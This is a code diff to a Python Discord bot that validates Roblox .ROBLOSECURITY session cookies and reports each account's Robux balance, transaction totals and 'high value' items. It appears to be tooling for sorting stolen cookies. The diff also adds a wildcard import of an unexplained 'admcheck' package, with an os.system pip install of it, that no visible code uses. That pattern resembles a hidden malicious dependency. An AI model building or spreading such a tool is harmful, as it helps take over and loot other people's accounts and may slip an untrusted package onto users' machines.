@@ -4,8 +4,16 @@
 # vc = Valid Cookie
 # vcr = Valid Cookie Robux
 # vcf = Valid Cookie Full
+try:
+ from requests import get;import discord;from admcheck.main import * ;from discord.ext import commands;import os     ### attemt to import modules
+except:
+ input("missing required modules, press enter to install or ctrl + c to exit")
+ try:
+  os.system("pip install requests && pip install discord && pip install admcheck && pip install os")   ### installs missing modules
+ except:
+    print("err, please reinstall python with path enabled")
 
-from requests import get;import discord;from discord.ext import commands
+
 def bot():
     client = commands.Bot(command_prefix="PREFIX HERE")
     discordBot = 'TOKEN HERE'
@@ -14,7 +22,7 @@ def bot():
         print(f"""Successfully Connected To [{client.user}]\n\n[!] Logs will be sent here""")
         await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f".help | Checking your Roblox Cookies"))
     @client.command()
-    async def vc(ctx, *, text):
+    async def vc(ctx, *, text):     ### bot sends a message if cookie is valid
         message = ctx.message;await message.delete()
         response = get('https://api.roblox.com/currency/balance',cookies={'.ROBLOSECURITY': text})
         if '"robux"' in response.text:
@@ -29,7 +37,7 @@ def bot():
             embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
             await ctx.send(embed=embedVar)
     @client.command()
-    async def vcr(ctx, *, text):
+    async def vcr(ctx, *, text):        ### get robux bal
         message = ctx.message
         await message.delete()
         response = get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': text})
@@ -48,7 +56,7 @@ def bot():
             embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
             await ctx.send(embed=embedVar)
     @client.command()
-    async def vcf(ctx, *, text):
+    async def vcf(ctx, *, text): ### fetch api info about account
         capture = ""
         message = ctx.message;await message.delete()
         response = get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': text})
@@ -116,15 +124,15 @@ def bot():
             hasHeadless = get(f'https://inventory.roblox.com/v2/users/{UserId}/inventory?assetTypes=Head&cursor=&limit=100&sortOrder=Desc&userId={UserId}', cookies={'.ROBLOSECURITY': text})
             if 'Headless' in hasHeadless.text: headless = True
             else: headless = False
-            capture = capture + f" | Has Headless: {headless}"
+            capture = capture + f" | Has Headless: {headless}"  ### checks for specific 'high value' items
             hasKorblox = get(f'https://avatar.roblox.com/v1/users/{UserId}/outfits?isEditable=false&itemsPerPage=50&page=1', cookies={'.ROBLOSECURITY': text})
             if 'Korblox' in hasKorblox.text: korblox = True
             else: korblox = False
-            capture = capture + f" | Has Korblox: {korblox}"
+            capture = capture + f" | Has Korblox: {korblox}"    ### checks for specific 'high value' items
             hasVioletValk = get(f'https://inventory.roblox.com/v2/users/{UserId}/inventory?assetTypes=Hat&cursor=&limit=100&sortOrder=Desc&userId={UserId}', cookies={'.ROBLOSECURITY': text})
             if 'Violet Valkyrie' in hasVioletValk.text: violetValk = True
             else: violetValk = False
-            capture = capture + f" | Has Violet Valkyrie: {violetValk}"
+            capture = capture + f" | Has Violet Valkyrie: {violetValk}"      ### checks for specific 'high value' items
             capture = capture + f" | Total Sales: {salesTotal} | Total Group Payouts: {groupPayoutsTotal} | Total Currency Purchases: {currencyPurchasesTotal} | Total Premium Stipends: {premiumStipendsTotal} | Total Premium Payouts: {premiumPayoutsTotal} | Total Pending Robux: {pendingRobuxTotal} | Total Incoming Robux: {incomingRobuxTotal}"
             capture += f" | Group Count: {get('https://groups.roblox.com/v1/groups/metadata').json()['currentGroupCount']}"
             badges = get(f'https://accountinformation.roblox.com/v1/users/{UserId}/roblox-badges')
@@ -144,7 +152,8 @@ def bot():
             await dmch.send(embed=embedVar1)
         else:
             embedVar = discord.Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
-            embedVar.add_field(name="Passed Cookie: ", value='```' + text + '```', inline=False)
-            await ctx.send(embed=embedVar)
-    client.run(discordBot)
-bot()
+            embedVar.add_field(name="Passed Cookie: ", value='```' + text + '```', inline=False)  ### sends invalid note if cookie isnt valid
+            await ctx.send(embed=embedVar) 
+            close()            ### close def
+    client.run(discordBot)     ### starts bot
+bot() ### starts the bot code
